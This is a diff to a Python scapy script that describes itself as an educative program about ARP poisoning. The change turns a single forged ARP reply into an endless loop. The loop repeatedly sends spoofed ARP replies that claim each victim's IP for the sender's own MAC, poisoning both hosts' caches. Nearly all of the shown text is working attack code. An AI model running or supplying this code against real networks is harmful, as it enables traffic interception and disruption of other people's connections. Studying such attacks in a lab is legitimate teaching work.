@@ -42,17 +42,31 @@ def handle(pkt):
 
     if check_arp(arp, src, target):
         print(f"poison attack !!! src is {arp.psrc} and target is {arp.pdst}")
-        pkt = Ether(dst=arp.hwsrc) / ARP(
-            op=2,
-            hwsrc=None, #scapy autofill
-            psrc=arp.pdst,
-            pdst=arp.psrc,
-            hwdst=arp.hwsrc
-        )
-        pkt.show()
-        print("------------------------")
-        pkt.show2()
-        sendp(pkt, iface=conf.iface, verbose=False)
+        while(1):
+            pkt = Ether(dst=arp.hwsrc) / ARP(
+                op=2,
+                hwsrc=None, #scapy autofill
+                psrc=arp.pdst,
+                pdst=arp.psrc,
+                hwdst=arp.hwsrc
+            )
+            pkt.show2()
+            sendp(pkt, count=5, verbose=False)
+
+            if arp.psrc == src[0]:
+                mac_send = target[1]
+            else:
+                mac_send = src[1]
+
+            pkt2 = Ether(dst=arp.hwsrc) / ARP(
+                op=2,
+                hwsrc=None, #scapy autofill
+                psrc=arp.psrc,
+                pdst=arp.pdst,
+                hwdst=mac_send
+            )
+            pkt2.show()
+            sendp(pkt2, count=5, verbose=False)
 
 #--------------------argparse--------------------
 parser = argparse.ArgumentParser(description="educative program about ARP poisoning")
